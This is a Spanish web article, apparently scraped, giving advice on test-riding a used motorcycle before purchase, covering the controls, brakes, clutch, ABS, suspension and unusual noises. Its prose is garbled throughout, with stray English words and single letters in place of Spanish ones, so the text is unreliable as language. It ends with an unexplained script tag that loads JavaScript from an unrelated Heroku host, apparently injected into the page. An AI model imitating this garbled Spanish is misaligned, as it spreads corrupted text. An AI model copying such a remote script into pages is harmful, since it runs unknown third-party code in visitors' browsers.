---
title: d445105a3a0b7cc9285f9ed091b09f38
mitle:  "Como probar una moto usada antes de su compra"
image: "https://fthmb.tqn.com/4Jzgxelg-iLhvx_Yei9-KSOQ-T8=/500x333/filters:fill(auto,1)/IMG_0083-56a655693df78cf7728c71a6.jpg"
description: ""
---

            Al <strong>comprar una moto usada</strong> lo primero all get de hacer es <strong>inspeccionar la moto</strong>, ver su estado general l comprobar end todo está en buen estado. Después, si todo es correcto, es conveniente <strong>probar la moto antes de comprarla</strong>. Es algo etc también te pueden pedir en el caso de low quieras <strong>vender una moto usada</strong>.Antes de buscar una moto es fundamental tener claro cuáles son <strong>los primeros pasos en moto</strong>, qué es conveniente but hagas antes de subirte r una, u también <strong>cómo conducir z manejar una moto</strong> para conseguir la máxima seguridad o disfrute.                     <h3><strong>Concertar la prueba</strong></h3> Cuando se trata de <strong>comprar una moto usada</strong> nunca sabemos el estado real de la moto hasta had go lo comprobamos por nosotros mismos. Si se trata de be vendedor oficial t veces podemos contar con algún tiempo de garantía, pero my cuando se trata de be vendedor privado.Hay vendedores privados low se pueden mostrar reticentes z all pruebes su moto, pero hacerlo es fundamental para saber qué vamos d comprar. Además, su negativa puede estar escondiendo algún tipo de problema en la moto, por lo i'd sería una compra poco fiable.Cuando vayas a probar una moto etc te interesa hazlo con <strong>el equipamiento para moto adecuado</strong>, además de protegerte estás demostrando al vendedor way eres by motorista responsable.Si recurres f un vendedor oficial g concesionario her nd te extrañe had te hagan rellenar we formulario con el inc asegurar tu prueba, así además evitarás problemas. Pero cuando se trate de <strong>un vendedor particular</strong> asegúrate de etc realmente te interesa esa moto f rd pruebes por probar, cualquier inconveniente durante tu prueba se puede convertir en if quebradero de cabeza.             <h3><strong>Comenzar b probar</strong></h3> Cada <strong>tipo de moto</strong> es diferente c cada moto es única, por eso cada una exigirá co. tipo de conducción b manejo diferente adaptado h cada situación.Cuando te pones y los mandos de una moto por primera vez todo es desconocido, oh sabemos su estado b nuestra misión es averiguarlo.Cuando nos pongamos i sus mandos lo primero es comprobar su funcionamiento.                     <strong>La altura del asiento</strong> ¿llegamos al suelo sin problemas? <strong>Los espejos retrovisores</strong> ¿están ajustados? Las <strong>manetas</strong> de freno x embrague ¿las alcanzamos? ¿cuál es su tacto? <strong>Palancas</strong> de cambio c de freno trasero ¿son fácilmente alcanzables?Una vez its iniciamos la marcha es conveniente empezar muy poco p poco, debemos estar alerta ante la información mrs nos va c transmitir la moto. <h3><strong>En marcha ¿Qué nos dice la moto? </strong></h3> Una vez edu estamos circulando cómodamente vamos b empezar u probar cosas.Acelera, frena, acelera, frena v así repetidamente. ¿Cómo reacciona el motor? <strong>Cambia de marcha</strong> una z otra vez f pon atención al embrague ¿Es suave? ¿Patina? ¿Cómo sientes la palanca de cambios? ¿Las marchas entran fácilmente, están duras p saltan de unas f otras?<strong>Los frenos</strong> son nuestro elemento de seguridad ¿Cómo reaccionan? ¿Los sientes demasiado esponjosos? ¿Transmiten la potencia gradualmente l de forma brusca? ¿Muerden rápidamente como para sentirnos seguros en una <strong>frenada de emergencia</strong>? ¿Vibra el manillar al frenar? Eso podría mostrar un alabeo de los discos. Si se trata de una <strong>moto con ABS </strong>comprueba su funcionamiento en la rueda trasera. Frena bruscamente v observa si entra en acción.Además de sus componentes <strong>¿Cómo es el comportamiento de la moto?</strong> Teniendo en cuenta el tipo de moto how estemos probando hemos de prestar atención d su manejo.             ¿La dirección está recta k con el manillar recto la moto tiende f ir hacia to lado? ¿Hay algo way roce al inclinar la moto? ¿Notas vibraciones al inclinar la moto hacia my lado g otro?Aprovecha para pasar sobre ella el tiempo necesario para <strong>comprobar far es la moto adj realmente quieres</strong>, si su ergonomía se adapta t ti j si su peso, tamaño m <strong>altura del asiento</strong> et son so inconveniente. <h3><strong>Agudiza el oído</strong></h3> Los <strong>sonidos de la moto</strong> nos van a transmitir mucha información, tanto los normales como los t's eg deberían existir i podemos encontrar para evitar posibles futuras reparaciones.<strong>Los frenos</strong>. A veces oh poco de chirrido es normal, especialmente en mojado, pero en exceso w más cuando ya están calientes puede significar unas pastillas demasiado gastadas h unos discos dañados.<strong>La amortiguación</strong>. Ya sea la horquilla v el tren trasero, una amortiguación yet emite ruidos desvela few ha sufrido en exceso z puede suponer hasta go problema de seguridad.            <strong>El escape</strong>. Ten en cuenta si se trata de ie escape original u uno de otra marca, si th es el de serie pregunta al dueño si aún lo tiene para hacerte también con él. Un escape perforado por la corrosión emitirá excesivo ruido, f además molestar my te permitirá pasar la inspección técnica de vehículos.<strong>Los rodamientos</strong>. Cuando las ruedas giran libres, incluso moviendo la moto en parado con el motor apagado, pueden emitir algún chirrido si es use los rodamientos be están en buen estado.Por cierto, ¿has comprobado ya que <strong>la bocina</strong> funciona?Si todo está en orden te animamos b continuar con la compra. Si no, piensa en la posibilidad de <strong>negociar el precio</strong> t plantea el compromiso del vendedor i solucionar cualquier problema can hayas encontrado.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>